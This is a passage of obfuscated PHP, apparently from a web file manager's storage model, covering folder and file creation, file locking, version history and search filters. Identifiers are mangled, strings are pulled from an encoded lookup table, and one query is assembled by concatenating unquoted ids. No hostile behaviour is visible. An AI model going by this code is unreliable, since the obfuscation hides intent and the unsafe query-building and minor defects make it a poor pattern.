array($ÒâÄ‰¨Ğ[535] => $Ÿ‰Ó«éÜ, $ÒâÄ‰¨Ğ[1111] => $ÒâÄ‰¨Ğ[2226], array($ÒâÄ‰¨Ğ[2401] => $Ÿ‰Ó«éÜ, $ÒâÄ‰¨Ğ[2402] => array($ÒâÄ‰¨Ğ[7], array($ÒâÄ‰¨Ğ[557], $ÒâÄ‰¨Ğ[556])))); } $this->join($‚Ö½Ş£ô); $°ù›Ï¶Ã = $¸÷£éò…; } private function _parseSearchWhere($ŠÚ¡è˜) { $¾è¡†¤± =& $_SERVER[ŒÅŸ‹ä†]; $éºß„¸Ş = array(); if (isset($ŠÚ¡è˜[$¾è¡†¤±[857]]) && $ŠÚ¡è˜[$¾è¡†¤±[857]]) { $éºß„¸Ş[$¾è¡†¤±[98]] = array($¾è¡†¤±[2403], $ŠÚ¡è˜[$¾è¡†¤±[857]]); } if (isset($ŠÚ¡è˜[$¾è¡†¤±[858]]) && $ŠÚ¡è˜[$¾è¡†¤±[858]]) { $»ŸàÂÀì = array($¾è¡†¤±[2404], $ŠÚ¡è˜[$¾è¡†¤±[858]]); if ($éºß„¸Ş[$¾è¡†¤±[98]]) { $éºß„¸Ş[$¾è¡†¤±[98]] = array($éºß„¸Ş[$¾è¡†¤±[98]], $»ŸàÂÀì, $¾è¡†¤±[2405]); } else { $éºß„¸Ş[$¾è¡†¤±[98]] = $»ŸàÂÀì; } } if (isset($ŠÚ¡è˜[$¾è¡†¤±[2397]]) && $ŠÚ¡è˜[$¾è¡†¤±[2397]] > 0) { $éºß„¸Ş[$¾è¡†¤±[89]] = array($¾è¡†¤±[2403], $ŠÚ¡è˜[$¾è¡†¤±[2397]]); } if (isset($ŠÚ¡è˜[$¾è¡†¤±[2398]]) && $ŠÚ¡è˜[$¾è¡†¤±[2398]]) { $»ŸàÂÀì = array($¾è¡†¤±[2404], $ŠÚ¡è˜[$¾è¡†¤±[2398]]); if ($éºß„¸Ş[$¾è¡†¤±[89]]) { $éºß„¸Ş[$¾è¡†¤±[89]] = array($éºß„¸Ş[$¾è¡†¤±[89]], $»ŸàÂÀì, $¾è¡†¤±[2405]); } else { $éºß„¸Ş[$¾è¡†¤±[89]] = $»ŸàÂÀì; } } if (isset($ŠÚ¡è˜[$¾è¡†¤±[690]]) && $ŠÚ¡è˜[$¾è¡†¤±[690]]) { $éºß„¸Ş[] = array($¾è¡†¤±[548] => $ŠÚ¡è˜[$¾è¡†¤±[690]], $¾è¡†¤±[546] => $ŠÚ¡è˜[$¾è¡†¤±[690]], $¾è¡†¤±[1111] => $¾è¡†¤±[2226]); } if (isset($ŠÚ¡è˜[$¾è¡†¤±[506]]) && $ŠÚ¡è˜[$¾è¡†¤±[506]]) { $íÊğÎÓà = $ŠÚ¡è˜[$¾è¡†¤±[506]]; if ($íÊğÎÓà == $¾è¡†¤±[88]) { $éºß„¸Ş[$¾è¡†¤±[505]] = 1; } else { if ($íÊğÎÓà == $¾è¡†¤±[2406]) { $éºß„¸Ş[$¾è¡†¤±[505]] = 0; } else { if ($íÊğÎÓà) { $íÊğÎÓà = is_array($íÊğÎÓà) ? $íÊğÎÓà : explode($¾è¡†¤±[60], $íÊğÎÓà); $éºß„¸Ş[$¾è¡†¤±[506]] = array($¾è¡†¤±[512], $íÊğÎÓà); $éºß„¸Ş[$¾è¡†¤±[505]] = 0; } } } } $this->_parseSearchParent($ŠÚ¡è˜, $éºß„¸Ş); if (isset($ŠÚ¡è˜[$¾è¡†¤±[2222]]) && trim($ŠÚ¡è˜[$¾è¡†¤±[2222]])) { $»Í˜÷Ñ° = trim($ŠÚ¡è˜[$¾è¡†¤±[2222]]); $¨²¾‰ = explode($¾è¡†¤±[63], $»Í˜÷Ñ°); if (strlen($»Í˜÷Ñ°) > 2 && (substr($»Í˜÷Ñ°, 0, 1) == $¾è¡†¤±[129] && substr($»Í˜÷Ñ°, -1) == $¾è¡†¤±[129]) || substr($»Í˜÷Ñ°, 0, 1) == $¾è¡†¤±[68] && substr($»Í˜÷Ñ°, -1) == $¾è¡†¤±[68]) { $»Í˜÷Ñ° = substr($»Í˜÷Ñ°, 1, -1); $¨²¾‰ = array($»Í˜÷Ñ°); } $éºß„¸Ş[$¾è¡†¤±[42]] = array(array($¾è¡†¤±[640], $¾è¡†¤±[2224] . $»Í˜÷Ñ° . $¾è¡†¤±[2224])); if (count($¨²¾‰) > 1) { $éºß„¸Ş[$¾è¡†¤±[42]] = array(); foreach ($¨²¾‰ as $ŒÚ¾³‡Ä) { if (!trim($ŒÚ¾³‡Ä)) { continue; } $éºß„¸Ş[$¾è¡†¤±[42]][] = array($¾è¡†¤±[640], $¾è¡†¤±[2224] . trim($ŒÚ¾³‡Ä) . $¾è¡†¤±[2224]); } } } return $éºß„¸Ş; } private function _parseSearchParent($Ğœƒêô“, &$òåÍ¬Šì) { $ÛØ—¦‰™ =& $_SERVER[ŒÅŸ‹ä†]; if (!isset($Ğœƒêô“[$ÛØ—¦‰™[201]]) || !$Ğœƒêô“[$ÛØ—¦‰™[201]]) { return; } $úş†¼ÆÜ = $this->pathInfo($Ğœƒêô“[$ÛØ—¦‰™[201]]); $¨‹¼†Í = $úş†¼ÆÜ[$ÛØ—¦‰™[201]] . $ÛØ—¦‰™[12] === $ÛØ—¦‰™[239]; $´™Î© = $úş†¼ÆÜ[$ÛØ—¦‰™[199]] == $ÛØ—¦‰™[603]; if ($úş†¼ÆÜ[$ÛØ—¦‰™[619]] == $ÛØ—¦‰™[620]) { $‘ºçÂô¸ = $this->sourceInfo($Ğœƒêô“[$ÛØ—¦‰™[201]]); $úş†¼ÆÜ[$ÛØ—¦‰™[609]] = $‘ºçÂô¸[$ÛØ—¦‰™[609]]; } $òåÍ¬Šì[$ÛØ—¦‰™[680]] = array($ÛØ—¦‰™[640], $úş†¼ÆÜ[$ÛØ—¦‰™[609]] . $Ğœƒêô“[$ÛØ—¦‰™[201]] . $ÛØ—¦‰™[641]); $í¹¶æí = isset($Ğœƒêô“[$ÛØ—¦‰™[2088]]) && in_array($ÛØ—¦‰™[603], $Ğœƒêô“[$ÛØ—¦‰™[2088]]); if (!$í¹¶æí || !$´™Î© || !$¨‹¼†Í || !$úş†¼ÆÜ[$ÛØ—¦‰™[507]]) { return; } if (!AuthModel::authCheckRoot($úş†¼ÆÜ[$ÛØ—¦‰™[507]][$ÛØ—¦‰™[508]])) { return; } $­šÕöÑ = $úş†¼ÆÜ[$ÛØ—¦‰™[594]] . $ÛØ—¦‰™[12]; if ($­šÕöÑ == $ÛØ—¦‰™[101]) { unset($òåÍ¬Šì[$ÛØ—¦‰™[680]]); $òåÍ¬Šì[$ÛØ—¦‰™[199]] = self::TYPE_GROUP; return; } $ÖìŸŒˆ = Model($ÛØ—¦‰™[610])->groupChildrenAll($­šÕöÑ); $Õºç‚¥– = count($ÖìŸŒˆ); if ($Õºç‚¥– <= 1) { return; } $¢ƒ»Â“ï = array($ÛØ—¦‰™[201] => 0, $ÛØ—¦‰™[199] => self::TYPE_GROUP, $ÛØ—¦‰™[594] => array($ÛØ—¦‰™[7], $ÖìŸŒˆ)); $Âûı¢—† = $this->field($ÛØ—¦‰™[2407])->where($¢ƒ»Â“ï)->limit($Õºç‚¥–)->select(); $òåÍ¬Šì[$ÛØ—¦‰™[680]] = array(); foreach ($Âûı¢—† as $ñ‡±ó§) { $òåÍ¬Šì[$ÛØ—¦‰™[680]][] = array($ÛØ—¦‰™[640], $ÛØ—¦‰™[618] . $ñ‡±ó§[$ÛØ—¦‰™[202]] . $ÛØ—¦‰™[641]); } $òåÍ¬Šì[$ÛØ—¦‰™[680]][] = $ÛØ—¦‰™[2226]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($¿ºñ•Òó) { $¦¿Ì¿Ñº =& $_SERVER[ŒÅŸ‹ä†]; $ëáã˜¼¼ = Model($¦¿Ì¿Ñº[602])->where(array($¦¿Ì¿Ñº[1911] => $¿ºñ•Òó))->find(); $„ŞÓ…¿Ë = $this->_mkdirRoot(SourceModel::TYPE_USER, $¿ºñ•Òó, $ëáã˜¼¼[$¦¿Ì¿Ñº[42]]); $this->userDesktopAdd($„ŞÓ…¿Ë); return $„ŞÓ…¿Ë; } public function userDesktopAdd($§µ‡áÄ) { $Û¤ûœÅö =& $_SERVER[ŒÅŸ‹ä†]; $˜Ğ”·ì– = LNG($Û¤ûœÅö[2408]); $ô¿·²ş = $this->mkdir($§µ‡áÄ, $˜Ğ”·ì–); $this->metaSet($ô¿·²ş, $Û¤ûœÅö[2409], $Û¤ûœÅö[101]); $this->metaSet($§µ‡áÄ, $Û¤ûœÅö[2410], $ô¿·²ş); } public function userPathSafeAdd($Óİöõ…ë) { $‚ˆ«ˆŒ =& $_SERVER[ŒÅŸ‹ä†]; $ÍµÍÄ¹ = Model($‚ˆ«ˆŒ[602])->getInfoFull($Óİöõ…ë); if (!$ÍµÍÄ¹) { return !1; } if (_get($ÍµÍÄ¹, $‚ˆ«ˆŒ[623])) { return $ÍµÍÄ¹[$‚ˆ«ˆŒ[560]][$‚ˆ«ˆŒ[2411]]; } $Â×áÔŸ× = $this->_mkdirRoot(SourceModel::TYPE_USER, $Óİöõ…ë, $‚ˆ«ˆŒ[2412], $‚ˆ«ˆŒ[2413]); Model($‚ˆ«ˆŒ[602])->metaSet($Óİöõ…ë, $‚ˆ«ˆŒ[2411], $Â×áÔŸ×); $this->metaSet($Â×áÔŸ×, $‚ˆ«ˆŒ[2414], $Óİöõ…ë); return $Â×áÔŸ×; } public function userPathAppAdd($Â´ÜÀ°ˆ, $È´Ğ·¶å = '', $ŒÄ…»ô = '') { $¥ò©ÑÕî =& $_SERVER[ŒÅŸ‹ä†]; $ùÑóª¹  = Model($¥ò©ÑÕî[602])->getInfoFull($Â´ÜÀ°ˆ); if (!$ùÑóª¹ ) { return !1; } $Çê¸Ëô… = $ùÑóª¹ [$¥ò©ÑÕî[560]] ? $ùÑóª¹ [$¥ò©ÑÕî[560]] : array(); $– ­³õŸ = $Çê¸Ëô…[$¥ò©ÑÕî[2415]]; if (!$– ­³õŸ) { $– ­³õŸ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Â´ÜÀ°ˆ, $¥ò©ÑÕî[2416], $¥ò©ÑÕî[2417]); Model($¥ò©ÑÕî[602])->metaSet($Â´ÜÀ°ˆ, $¥ò©ÑÕî[2415], $– ­³õŸ . $¥ò©ÑÕî[12]); $this->metaSet($– ­³õŸ, $¥ò©ÑÕî[2415], $Â´ÜÀ°ˆ); } if (!$È´Ğ·¶å) { return $– ­³õŸ; } $±–‚û¨Ò = $Çê¸Ëô…[$¥ò©ÑÕî[2418] . $È´Ğ·¶å]; if (!$±–‚û¨Ò) { $±–‚û¨Ò = $this->mkdir($– ­³õŸ, $È´Ğ·¶å); Model($¥ò©ÑÕî[602])->metaSet($Â´ÜÀ°ˆ, $¥ò©ÑÕî[2418] . $È´Ğ·¶å, $±–‚û¨Ò); $this->metaSet($±–‚û¨Ò, $¥ò©ÑÕî[2418] . $È´Ğ·¶å, $Â´ÜÀ°ˆ); } if (!$ŒÄ…»ô) { return $±–‚û¨Ò; } $İÏˆ°Ø“ = $this->mkdir($±–‚û¨Ò, $ŒÄ…»ô); return $İÏˆ°Ø“; } public function groupRootAdd($å÷ÑÁ†ã) { $¬Ñæù­± =& $_SERVER[ŒÅŸ‹ä†]; $üå„è¢” = Model($¬Ñæù­±[610])->where(array($¬Ñæù­±[2211] => $å÷ÑÁ†ã))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $å÷ÑÁ†ã, $üå„è¢”[$¬Ñæù­±[42]]); } public function systemRootPathAdd($ÉŒã«ÃŒ) { if ($ÉŒã«ÃŒ != $_SERVER[ŒÅŸ‹ä†][633]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ÉŒã«ÃŒ); } public function userRootRemove($ˆ”ºÅ­‰) { $ê±çüğ± = $this->targetSourceRoot(SourceModel::TYPE_USER, $ˆ”ºÅ­‰, !0); foreach ($ê±çüğ± as $¢ô¦œÔù) { if (!$¢ô¦œÔù) { continue; } $this->remove($¢ô¦œÔù[$_SERVER[ŒÅŸ‹ä†][202]], !1); } } public function groupRootRemove($çí§çø) { $˜êò´æØ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $çí§çø); if (!$˜êò´æØ) { return; } $this->remove($˜êò´æØ[$_SERVER[ŒÅŸ‹ä†][202]], !1); } private function _mkdirRoot($ıéÑš, $»‚¼ÒŒé, $Â¤¥¯›², $Œ¡è‚å² = '') { $ÂáğÊÛ =& $_SERVER[ŒÅŸ‹ä†]; $Ô±õ›ù = KodUser::id(); $Á›é‰ğ¹ = array($ÂáğÊÛ[497] => 0, $ÂáğÊÛ[676] => $ıéÑš, $ÂáğÊÛ[677] => $»‚¼ÒŒé, $ÂáğÊÛ[674] => 1, $ÂáğÊÛ[678] => $Ô±õ›ù, $ÂáğÊÛ[679] => $Ô±õ›ù, $ÂáğÊÛ[675] => $Œ¡è‚å², $ÂáğÊÛ[680] => $ÂáğÊÛ[618], $ÂáğÊÛ[524] => 0, $ÂáğÊÛ[645] => 0, $ÂáğÊÛ[563] => 0, $ÂáğÊÛ[681] => $ÂáğÊÛ[12]); if ($¨°ÛãÔû = $this->where($Á›é‰ğ¹)->find()) { return $¨°ÛãÔû[$ÂáğÊÛ[202]]; } $ô»ú°Ù = "\115\x6f\x64\x65\154\x53\157\x75\162\x63\x65\56\155\x6b\144\151\162\122\157\157\164\x2e{$ıéÑš}\56{$»‚¼ÒŒé}\x2e" . $Â¤¥¯›²; CacheLock::lock($ô»ú°Ù); $Á›é‰ğ¹[$ÂáğÊÛ[42]] = $Â¤¥¯›²; $°ôË—¼¹ = $this->add($Á›é‰ğ¹); $œ ›ä£„ = array($ÂáğÊÛ[682] => short_id($°ôË—¼¹)); $this->where(array($ÂáğÊÛ[511] => $°ôË—¼¹))->save($œ ›ä£„); CacheLock::unlock($ô»ú°Ù); return $°ôË—¼¹; } private function targetSourceRoot($ş‚Ğ–’Õ, $Û„ñ¾, $Şìêş­ª = false) { $±·³ßÛá =& $_SERVER[ŒÅŸ‹ä†]; $áÀ—İ©ä = array($±·³ßÛá[497] => 0, $±·³ßÛá[676] => $ş‚Ğ–’Õ, $±·³ßÛá[677] => $Û„ñ¾); if ($Şìêş­ª) { $Åûğ“Ãã = $this->where($áÀ—İ©ä)->select(); return $Åûğ“Ãã ? $Åûğ“Ãã : array(); } $†£´üû = $this->where($áÀ—İ©ä)->find(); return $†£´üû ? $†£´üû : array(); } public function sourceRootGroup($Ú“ì³Åæ) { $ò³­ŸÖ =& $_SERVER[ŒÅŸ‹ä†]; if (is_string($Ú“ì³Åæ)) { $Ú“ì³Åæ = array($Ú“ì³Åæ); } $¿¡ô¢Œ« = $this->listSourceRoot(SourceModel::TYPE_GROUP, $Ú“ì³Åæ, $ò³­ŸÖ[231]); $Ğ†Æ›Şë = array($ò³­ŸÖ[455] => $¿¡ô¢Œ«, $ò³­ŸÖ[452] => array($ò³­ŸÖ[855] => count($Ú“ì³Åæ))); $this->_listDataApply($Ğ†Æ›Şë[$ò³­ŸÖ[455]]); $this->_listMake($Ğ†Æ›Şë); return array_to_keyvalue($Ğ†Æ›Şë[$ò³­ŸÖ[95]], $ò³­ŸÖ[594]); } public function mkfile($ùßÙ˜†›, $—Áï„¬, $‘÷ŸÄ›¹ = '', $›ªüç÷– = REPEAT_RENAME) { $ŒûŸ¯ö° =& $_SERVER[ŒÅŸ‹ä†]; $æ®Ø–ë¡ = KodIO::ioFileDriverGet($ŒûŸ¯ö°[503] . $ùßÙ˜†› . $ŒûŸ¯ö°[412]); $ÌˆÒÀ‘§ = Model($ŒûŸ¯ö°[702])->addFileByContent($‘÷ŸÄ›¹, $æ®Ø–ë¡, $—Áï„¬); return $this->_createFileCall($ùßÙ˜†›, $—Áï„¬, $ÌˆÒÀ‘§, $›ªüç÷–, $ŒûŸ¯ö°[1487]); } public function addFile($øåİÔ´«, $¥–ƒ¯©, $ÍËı§ì, $ÀĞ¡·äŠ = false, $£«»¾ ş = REPEAT_RENAME) { $óİì§ÌÅ =& $_SERVER[ŒÅŸ‹ä†]; $¶Ç¨ôœû = KodIO::ioFileDriverGet($óİì§ÌÅ[503] . $øåİÔ´« . $óİì§ÌÅ[412]); $‚Ë©¥Œ = Model($óİì§ÌÅ[702])->addFile($¥–ƒ¯©, $¶Ç¨ôœû, $ÍËı§ì, $ÀĞ¡·äŠ); return $this->_createFileCall($øåİÔ´«, $ÍËı§ì, $‚Ë©¥Œ, $£«»¾ ş); } public function addFileByFileID($¯¡âçÎ, $èæäØÑİ, $Ù¿èá©£, $éò¼ôÓ = REPEAT_RENAME) { $—ú¹»‰ =& $_SERVER[ŒÅŸ‹ä†]; $Àõ İ®ñ = Model($—ú¹»‰[702])->find($èæäØÑİ); Model($—ú¹»‰[702])->linkAdd($èæäØÑİ); return $this->_createFileCall($¯¡âçÎ, $Ù¿èá©£, $Àõ İ®ñ, $éò¼ôÓ); } public function addFileByRemote($ïäÙ™ñ, $€Şˆà¨µ, $ªéáÕ†¶, $¥İ¤éîë = array(), $ËÌ·İ¤¶ = REPEAT_RENAME) { $»ÅÓø†Ì = Model($_SERVER[ŒÅŸ‹ä†][702])->addFileByRemote($€Şˆà¨µ, $ªéáÕ†¶, $¥İ¤éîë); return $this->_createFileCall($ïäÙ™ñ, $ªéáÕ†¶, $»ÅÓø†Ì, $ËÌ·İ¤¶); } private function _createFileCall($ÕôÚÖ•Ú, $ººø°Ü•, $¿ğúİ¦ñ, $š±…˜©, $•íÈÕì = "\165\160\154\157\x61\144") { $÷¾Öõ =& $_SERVER[ŒÅŸ‹ä†]; if (!$¿ğúİ¦ñ) { return !1; } $®»ê±’Å = !1; $this->setMasterDB(); $this->lockWriteStart($ÕôÚÖ•Ú, $ººø°Ü•); $‚İ…ò® = $this->fileNameExist($ÕôÚÖ•Ú, $ººø°Ü•); $ƒ‡Ş¼ = $this->_createFile($ÕôÚÖ•Ú, $ººø°Ü•, $¿ğúİ¦ñ, $š±…˜©, $®»ê±’Å); if (!$®»ê±’Å) { Model($÷¾Öõ[565])->remove($¿ğúİ¦ñ[$÷¾Öõ[562]]); } if ($®»ê±’Å && $ƒ‡Ş¼ && $ƒ‡Ş¼ != $‚İ…ò®) { Model($÷¾Öõ[2380])->eventCreate($ƒ‡Ş¼, $•íÈÕì); } $this->lockWriteEnd($ÕôÚÖ•Ú, $ººø°Ü•); return $ƒ‡Ş¼; } public function mkdir($Ôñ»˜¿Ğ, $–”Ã‰Úœ, $³ìäÜğ€ = REPEAT_SKIP) { $‹ƒèçğ‡ =& $_SERVER[ŒÅŸ‹ä†]; $this->setMasterDB(); $µ´èå¤æ = $this->sourceInfo($Ôñ»˜¿Ğ); if (!$µ´èå¤æ) { return !1; } $this->lockWriteStart($Ôñ»˜¿Ğ, $–”Ã‰Úœ); if ($³ìäÜğ€ !== !1) { $•Ìáªò± = $this->fileNameExist($Ôñ»˜¿Ğ, $–”Ã‰Úœ); if ($•Ìáªò± && $³ìäÜğ€ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Ôñ»˜¿Ğ, $–”Ã‰Úœ); return $•Ìáªò±; } $–”Ã‰Úœ = $this->fileNameAuto($Ôñ»˜¿Ğ, $–”Ã‰Úœ, $³ìäÜğ€); } $¥ŠÚˆäù = array($‹ƒèçğ‡[674] => 1, $‹ƒèçğ‡[514] => $–”Ã‰Úœ, $‹ƒèçğ‡[675] => $‹ƒèçğ‡[12], $‹ƒèçğ‡[563] => 0, $‹ƒèçğ‡[645] => 0); $Ë³ğùğá = $this->_addSource($¥ŠÚˆäù, $µ´èå¤æ); Model($‹ƒèçğ‡[2380])->eventCreate($Ë³ğùğá, $‹ƒèçğ‡[1488]); $this->lockWriteEnd($Ôñ»˜¿Ğ, $–”Ã‰Úœ); return $Ë³ğùğá; } public function listSourceRoot($å±ğÄËû, $¾ç£Å¸, $™ÎÀÂçÂ = "\x73\x6f\165\162\x63\x65\x49\104\x2c\164\141\x72\147\145\x74\111\104\54\x73\151\x7a\145") { $­›íäı˜ =& $_SERVER[ŒÅŸ‹ä†]; $ö£©×Šƒ = $­›íäı˜[472]; $ö¤‘¹®û = array(); $åŠà»Á = 1024 * 50; $Ç¯òËË = is_array($Ç¯òËË) ? $Ç¯òËË : array(); $­îËŠÔè = count($¾ç£Å¸); $ŠÔ®â•Ş = $this->tablePrefix . $­›íäı˜[2419]; for ($Çúé»½— = 0; $Çúé»½— < $­îËŠÔè; $Çúé»½—++) { $Ì¯åáÇ = $¾ç£Å¸[$Çúé»½—]; $ö£©×Šƒ .= "\x53\105\114\105\103\x54\40\x2a\x20\x46\122\117\115\40\50\x53\x45\114\105\103\124\x20{$™ÎÀÂçÂ}\40\x46\122\x4f\115\x20\x60{$ŠÔ®â•Ş}\140\x20\127\110\105\x52\x45\x20"; $ö£©×Šƒ .= "\x60\x70\x61\x72\145\156\164\111\x44\140\x3d\x30\40\101\x4e\104\40\140\x74\141\x72\x67\x65\x74\111\104\x60\x3d{$Ì¯åáÇ}\x20\101\116\104\40\x60\x74\x61\162\x67\x65\x74\x54\171\160\x65\x60\75{$å±ğÄËû}\40\x61\x6e\144\x20\x66\151\x6c\145\x54\x79\160\145\x3d\47\47\40\x6c\x69\x6d\x69\164\40\x31\x29\40\x61\x73\x20\x74\142\137{$Çúé»½—}\40\125\x4e\x49\117\116\40\x41\x4c\114\40"; if ((strlen($ö£©×Šƒ) >= $åŠà»Á || $Çúé»½— == $­îËŠÔè - 1) && $ö£©×Šƒ) { $ö£©×Šƒ = substr($ö£©×Šƒ, 0, -strlen($­›íäı˜[1149])); $ºşÆ·œ¤ = $this->query($ö£©×Šƒ); $ö£©×Šƒ = $­›íäı˜[12]; $ö¤‘¹®û = array_merge($ö¤‘¹®û, $ºşÆ·œ¤); } } return $ö¤‘¹®û; } private function _createFile($ùçñ÷˜, $ÜÍ¤‘šã, $Ëİì–ç™, $õßã ¥€, &$„Ÿ‹‘•¸) { $’ãÏ«›¸ =& $_SERVER[ŒÅŸ‹ä†]; $È×§Â±ş = $this->sourceInfo($ùçñ÷˜); if (!$Ëİì–ç™ || !$È×§Â±ş) { return !1; } if ($õßã ¥€ !== !1) { $Ãìƒğ»‡ = $this->fileNameExist($ùçñ÷˜, $ÜÍ¤‘šã); } $„Ÿ‹‘•¸ = !0; if ($õßã ¥€ && $Ãìƒğ»‡) { if ($õßã ¥€ == REPEAT_SKIP) { $„Ÿ‹‘•¸ = !1; return $Ãìƒğ»‡; } else { if ($õßã ¥€ == REPEAT_REPLACE) { $’É™‚·¨ = $this->sourceInfo($Ãìƒğ»‡); $«ë°­óŸ = $this->fileHistory($’É™‚·¨, $Ëİì–ç™[$’ãÏ«›¸[562]], $Ëİì–ç™[$’ãÏ«›¸[89]]); if (!$«ë°­óŸ) { $„Ÿ‹‘•¸ = !1; } else { $this->folderSizeReset($ùçñ÷˜); } return $Ãìƒğ»‡; } else { $ÜÍ¤‘šã = $this->fileNameAuto($ùçñ÷˜, $ÜÍ¤‘šã, $õßã ¥€, !1); } } } $«êï«Ü© = array($’ãÏ«›¸[674] => 0, $’ãÏ«›¸[514] => $ÜÍ¤‘šã, $’ãÏ«›¸[675] => substr(get_path_ext($ÜÍ¤‘šã), 0, 10), $’ãÏ«›¸[563] => $Ëİì–ç™[$’ãÏ«›¸[562]], $’ãÏ«›¸[645] => $Ëİì–ç™[$’ãÏ«›¸[89]]); $©æˆ½£“ = $this->_addSource($«êï«Ü©, $È×§Â±ş); $this->folderSizeReset($ùçñ÷˜, intval($«êï«Ü©[$’ãÏ«›¸[89]])); return $©æˆ½£“; } protected function fileHistory($Ïîîõ•Ë, $©¾†Şú, $ôèå‰ò) { $¾ç“´¯ =& $_SERVER[ŒÅŸ‹ä†]; if ($Ïîîõ•Ë[$¾ç“´¯[562]] == $©¾†Şú) { return !1; } $this->checkLock($Ïîîõ•Ë[$¾ç“´¯[202]], $©¾†Şú); Model($¾ç“´¯[2420])->addHistory($Ïîîõ•Ë); $Òèà®ıõ = array($¾ç“´¯[679] => USER_ID, $¾ç“´¯[518] => time(), $¾ç“´¯[562] => $©¾†Şú, $¾ç“´¯[89] => $ôèå‰ò); $this->where(array($¾ç“´¯[511] => $Ïîîõ•Ë[$¾ç“´¯[202]]))->save($Òèà®ıõ); $this->sourceCacheClear($Ïîîõ•Ë[$¾ç“´¯[202]]); return !0; } public function checkLock($šİ•¡€, $àÂÊ‡·) { $û–ŞÔº­ =& $_SERVER[ŒÅŸ‹ä†]; $Ş‰­Å€• = $this->pathInfo($šİ•¡€); if (!$this->fileIsLock($Ş‰­Å€•, !0)) { return; } $î¢¹­ = Session::get($û–ŞÔº­[2421]); $ã§àÒ†ä = substr($Ş‰­Å€•[$û–ŞÔº­[42]], 0, -1 - strlen($Ş‰­Å€•[$û–ŞÔº­[177]])) . $û–ŞÔº­[1340] . $î¢¹­ . $û–ŞÔº­[10] . $Ş‰­Å€•[$û–ŞÔº­[177]]; $ú–˜ãï˜ = Model($û–ŞÔº­[702])->find($àÂÊ‡·); $this->_createFileCall($Ş‰­Å€•[$û–ŞÔº­[201]], $ã§àÒ†ä, $ú–˜ãï˜, REPEAT_REPLACE, $û–ŞÔº­[1487]); $Ñ‰Óï = $Ş‰­Å€•[$û–ŞÔº­[560]][$û–ŞÔº­[638]]; $ã³ÇàÂÓ = $Ñ‰Óï[$û–ŞÔº­[2422]] ? $Ñ‰Óï[$û–ŞÔº­[2422]] : $Ñ‰Óï[$û–ŞÔº­[42]]; show_json(LNG($û–ŞÔº­[2423]) . $û–ŞÔº­[2424] . LNG($û–ŞÔº­[2425]) . $û–ŞÔº­[2426] . $ã³ÇàÂÓ . $û–ŞÔº­[2427], !1); } public function fileIsLock($æ³Ôç„, $’³Š®€Å = false) { $¶¿ğê¸ =& $_SERVER[ŒÅŸ‹ä†]; if (!_get($æ³Ôç„, $¶¿ğê¸[634], 0)) { return !1; } if ($æ³Ôç„[$¶¿ğê¸[560]][$¶¿ğê¸[637]] != USER_ID) { return !0; } $ª‡²Ğä¿ = $GLOBALS[$¶¿ğê¸[6]][$¶¿ğê¸[102]][$¶¿ğê¸[635]]; if ($æ³Ôç„[$¶¿ğê¸[560]][$¶¿ğê¸[636]] <= time() - $ª‡²Ğä¿) { $this->metaSet($æ³Ôç„[$¶¿ğê¸[202]], $¶¿ğê¸[637], null); $this->metaSet($æ³Ôç„[$¶¿ğê¸[202]], $¶¿ğê¸[636], null); } if ($’³Š®€Å) { $this->metaSet($æ³Ôç„[$¶¿ğê¸[202]], $¶¿ğê¸[636], time()); } return !1; } private function _addSource($ÎÇ¶ŞÌ, $ÆƒÂú°Ğ) { $ü˜Ï¼Ú£ =& $_SERVER[ŒÅŸ‹ä†]; $ˆÏ¥ğôÚ = KodUser::id(); $ìÂÚµıì = array($ü˜Ï¼Ú£[676] => $ÆƒÂú°Ğ[$ü˜Ï¼Ú£[199]], $ü˜Ï¼Ú£[677] => $ÆƒÂú°Ğ[$ü˜Ï¼Ú£[594]], $ü˜Ï¼Ú£[678] => $ˆÏ¥ğôÚ, $ü˜Ï¼Ú£[679] => $ˆÏ¥ğôÚ, $ü˜Ï¼Ú£[497] => $ÆƒÂú°Ğ[$ü˜Ï¼Ú£[202]], $ü˜Ï¼Ú£[680] => $ÆƒÂú°Ğ[$ü˜Ï¼Ú£[609]] . $ÆƒÂú°Ğ[$ü˜Ï¼Ú£[202]] . $ü˜Ï¼Ú£[60], $ü˜Ï¼Ú£[524] => 0, $ü˜Ï¼Ú£[681] => $ü˜Ï¼Ú£[12]); $ÎÇ¶ŞÌ = array_merge($ìÂÚµıì, $ÎÇ¶ŞÌ); $this->updateModifyTime($ÎÇ¶ŞÌ[$ü˜Ï¼Ú£[201]]); $ŠĞ…ªşÅ = $ü˜Ï¼Ú£[2428] . $ÆƒÂú°Ğ[$ü˜Ï¼Ú£[202]]; if (isset(self::$cacheChildList[$ŠĞ…ªşÅ])) { unset(self::$cacheChildList[$ŠĞ…ªşÅ]); } static $¶¼ÂÇÀé = false; if (!$¶¼ÂÇÀé) { Hook::trigger($ü˜Ï¼Ú£[664], $ÎÇ¶ŞÌ); $¶¼ÂÇÀé = !0; } $ëíõõÌ¸ = $this->add($ÎÇ¶ŞÌ); $ĞÓòÌ¹Ô = array($ü˜Ï¼Ú£[682] => short_id($ëíõõÌ¸)); $this->where(array($ü˜Ï¼Ú£[511] => $ëíõõÌ¸))->save($ĞÓòÌ¹Ô); $this->setNamePinyin($ëíõõÌ¸, $ÎÇ¶ŞÌ[$ü˜Ï¼Ú£[42]]); return $ëíõõÌ¸; } public function remove($­òê¿æİ, $Ïˆ†¥à× = true) { $Š©–ÃÏë =& $_SERVER[ŒÅŸ‹ä†]; $°Ï¯á¦Œ = $this->sourceInfo($­òê¿æİ); $£Ó‰œµÀ = intval($°Ï¯á¦Œ[$Š©–ÃÏë[199]]) === self::TYPE_SYSTEM; $í«Â¹ÏÊ = Model($Š©–ÃÏë[527])->get($Š©–ÃÏë[2429]) == $Š©–ÃÏë[101]; if ($£Ó‰œµÀ || $Ïˆ†¥à× || !$í«Â¹ÏÊ) { return $this->removeNow($­òê¿æİ, $Ïˆ†¥à×); } $ºÅÜ˜ßë = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $âÑã÷ı = $°Ï¯á¦Œ[$Š©–ÃÏë[199]] == self::TYPE_USER ? $Š©–ÃÏë[690] : $Š©–ÃÏë[603]; if ($âÑã÷ı == $Š©–ÃÏë[690]) { $ÜÄ˜ªŞ¶ = 